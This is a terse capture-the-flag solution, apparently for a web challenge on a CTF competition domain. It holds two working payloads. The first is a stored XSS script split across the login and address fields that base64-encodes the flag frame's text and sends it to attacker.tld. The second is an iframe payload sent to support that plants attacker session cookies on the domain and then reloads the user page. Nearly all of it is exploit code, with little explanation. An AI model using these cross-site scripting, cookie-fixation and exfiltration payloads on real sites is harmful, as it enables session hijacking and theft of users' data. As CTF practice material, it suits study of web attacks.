Create user
```
login <script>location='//attacker.tld/?'/*
address */+btoa(parent.flag.flag.innerText)</script>
```

Send to support
```html
<iframe name="flag" onload="
document.cookie='session=attacker_session; domain=.web.ctfcompetition.com; path=/me';
document.cookie='session.sig=attacker_session_sig; domain=.web.ctfcompetition.com; path=/me';
iframe = document.createElement('iframe');
iframe.src = 'https://typeselfsub.web.ctfcompetition.com/me';
document.body.appendChild(iframe);
" src="https://typeselfsub.web.ctfcompetition.com/flag"></iframe>
```